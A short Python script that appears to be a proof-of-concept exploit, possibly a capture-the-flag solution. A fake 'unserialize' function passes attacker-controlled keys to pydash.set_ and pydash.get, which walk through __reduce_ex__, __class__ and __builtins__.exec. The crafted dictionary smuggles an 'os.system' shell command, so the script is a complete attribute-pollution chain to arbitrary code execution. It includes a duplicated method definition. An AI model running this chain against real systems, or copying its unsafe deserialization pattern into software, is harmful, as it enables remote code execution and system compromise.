import pydash


class Books:
    def __init__(self): pass

    def __setitem__(self, key: str, value) -> None:
        return pydash.set_(self, key, value)

    def __setitem__(self, key: str, value) -> None:
        return pydash.set_(self, key, value)


def unserialize(obj: dict[str | object]):
    books = Books()
    for book in obj:
        if isinstance(obj[book], str) and obj[book].startswith("!"):
            new_obj_book = obj[book][1::].strip()
            books[book.strip()] = pydash.get(books, new_obj_book)
        else:
            books[book.strip()] = pydash.get(obj, book)
    return books


res = unserialize({
    "    __class__.__class_getitem__": "!__reduce_ex__",
    "   newobj": "!__class__.3.0",
    "  __class__.__class_getitem__": "!newobj.__getattribute__",
    " __class__.__getattr__": "!__class__.__builtins__.exec",
    "import os; os\.system('ls')": "x",
})
print(res.__dict__)
